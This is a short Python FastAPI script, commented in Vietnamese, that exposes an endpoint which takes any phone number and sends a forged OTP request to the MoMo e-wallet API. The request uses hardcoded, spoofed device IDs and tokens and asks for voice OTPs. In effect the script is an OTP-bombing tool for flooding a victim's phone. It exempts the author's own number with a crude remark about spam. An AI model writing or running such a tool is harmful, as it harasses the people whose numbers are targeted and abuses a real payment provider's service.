from fastapi import FastAPI #import class FastAPI() từ thư viện fastapi
import requests,random, json
app = FastAPI() # gọi constructor và gán vào biến app


@app.get("/phone={sdt}")
async def momo(sdt):
 if sdt=="0328774559":
  return "Spam số tao cái lồn à"
 import json, random, requests 
 time=random.randint(1000000000000,1999999999999)
 data={
  "user":sdt,
  "msgType": "SEND_OTP_MSG",
  "cmdId": f"{time}000000",
  "lang": "vi",
  "time": time,
  "channel": "APP",
  "appVer": "31132",
  "appCode": "3.1.13",
  "deviceOS": "ANDROID",
  "buildNumber": "0",
  "appId": "vn.momo.platform",
  "result": "true",
  "errorCode": "0",
  "errorDesc": "",
  "momoMsg": {
    "_class": "mservice.backend.entity.msg.RegDeviceMsg",
    "number": sdt,
    "imei": "dd0a83fd-6b7c-c45c-cc8e-8bdf56e6e39f",
    "cname": "Vietnam",
    "ccode": "084",
    "device": "CPH1605",
    "firmware": "23",
    "hardware": "mt6755",
    "manufacture": "OPPO",
    "csp": "Mobifone",
    "icc": "",
    "mcc": "452",
    "device_os": "Android",
    "secure_id": "8690edc7f026c91a"
  },
  "extra": {
    "action": "SEND",
    "rkey": "JblizbbwaRqHfbjgdE5B",
    "AAID": "d2c5960f-4f4b-4a3a-af16-a1073c65de46",
    "IDFA": "",
    "TOKEN": "epHwy5M5RJ2uQtTs5BuK9L:APA91bEEftQpDT1D8hfr49F5IFaUaT1Ir1u16DpPPaZvZxevGcal5andVP8DNYCTUwdi8G5TNxzLbNuRdfjP0UxQT5udl4dQheDDS51rm1F4JDCsUPhk05XxVQJ72ZcviVB0tCSD1usx",
    "SIMULATOR": "false",
    "SECUREID": "8690edc7f026c91a",
    "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
    "isVoice": "true",
    "REQUIRE_HASH_STRING_OTP": "true",
    "checkSum": ""
  
 }
 }

 h={
'Host':'api.momo.vn',
'msgtype':'SEND_OTP_MSG',
'user-agent':'okhttp/4.9.0',}
 data = json.dumps(data)
 t=requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,data=data).text
 return t
